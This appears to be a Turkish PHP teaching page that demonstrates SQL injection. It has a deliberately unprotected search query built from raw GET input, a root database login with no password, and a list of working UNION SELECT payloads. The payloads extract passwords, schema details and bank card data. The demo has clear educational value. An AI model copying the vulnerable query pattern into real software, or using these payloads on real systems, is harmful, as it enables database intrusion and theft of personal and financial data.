<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SQL Injection Korumasız Girdi</title>
</head>

<body>
    <a href="Korumali.php">Korumalı Sorgu</a>
    <p></p>
    <form action="Veritabani.php" class="form" method="post">
        <table class="table">
            <tr>
                <th>TC</th>
                <th>Ad</th>
                <th>Soyad</th>
                <th>Meslek</th>
                <th>Telefon</th>
            </tr>
            <tr>
                <td><input type="text" name="tc"></td>
                <td><input type="text" name="ad"></td>
                <td><input type="text" name="soyad"></td>
                <td><input type="text" name="meslek"></td>
                <td><input type="text" name="telefon"></td>
                <td><input type="submit" class="btn btn-primary" value="Kaydet" name="korumasizkayit"></td>
            </tr>
        </table>
    </form>
    <h1>Kayıtlar</h1>
    <form action="Korumasiz.php" class="container" method="GET">
        <table>
            <tr>
                <td>Ad:</td>
                <td><input type="text" name="ad" class="form-control">

                </td>
                <td><input class="form-control btn btn-primary" type="submit" value="Ara" name="ara"></td>
                <td><a href="Korumasiz.php">Yenile</a></td>
            </tr>
        </table>
    </form>
    <table class="table">
        <tr>
            <th>TC</th>
            <th>Ad</th>
            <th>Soyad</th>
            <th>Meslek</th>
            <th>Telefon</th>
        </tr>
        <p>Örnek Sorgular</p>
        <ul>
            <li>Şifreleri ifşa etme: <b>%' UNION SELECT id,tc,ad,soyad,sifre FROM kayitlar#</b></li>
            <li>Veritabanı adı öğrenme:<b> %' UNION SELECT 'a','b','c','d',DATABASE()#</b></li>
            <li>Diğer tablo isimlerini çekme: <b>%' UNION SELECT 'a','b','c','d',table_name FROM information_schema.tables#%'</b></li>
            <li>Diğer tablo sütunlarını çekme:<b> %' UNION SELECT 'a','b','c','d',COLUMN_NAME
                FROM INFORMATION_SCHEMA.COLUMNS
                WHERE TABLE_SCHEMA = 'sqlinjection' AND TABLE_NAME = 'kayitlar';#%' </b></li>
            <li>Diğer tablodaki kayıtları çekme, bu örnekte önemli banka bilgileri bulunan tablodaki kayıtları çekeceğiz. Sorgu: 
           <b> %' UNION SELECT tc,kartno,sifre,'a','b' FROM bankbilgileri# </b>
            </li>
        </ul>
        <?php
        $vt = mysqli_connect("localhost", "root", "", "sqlinjection");
        if (isset($_GET['ara'])) {
            $ad = $_GET['ad'];
            $sorgu = "SELECT tc,ad,soyad,meslek,telefon FROM kayitlar WHERE ad LIKE '%$ad%'";
            echo "Yapılan Sorgu: " . $sorgu;
        } else {
            $sorgu = "SELECT * FROM kayitlar";
        }
        $sonuc = $vt->query($sorgu);
        if ($sonuc) {
            while ($satir = $sonuc->fetch_assoc()) {
        ?>

                <tr>
                    <td><?php echo $satir['tc']; ?></td>
                    <td><?php echo $satir['ad']; ?></td>
                    <td><?php echo $satir['soyad']; ?></td>
                    <td><?php echo $satir['meslek']; ?></td>
                    <td><?php echo $satir['telefon']; ?></td>
                </tr> <?php
                    }
                }
                        ?>
    </table>
</body>

</html>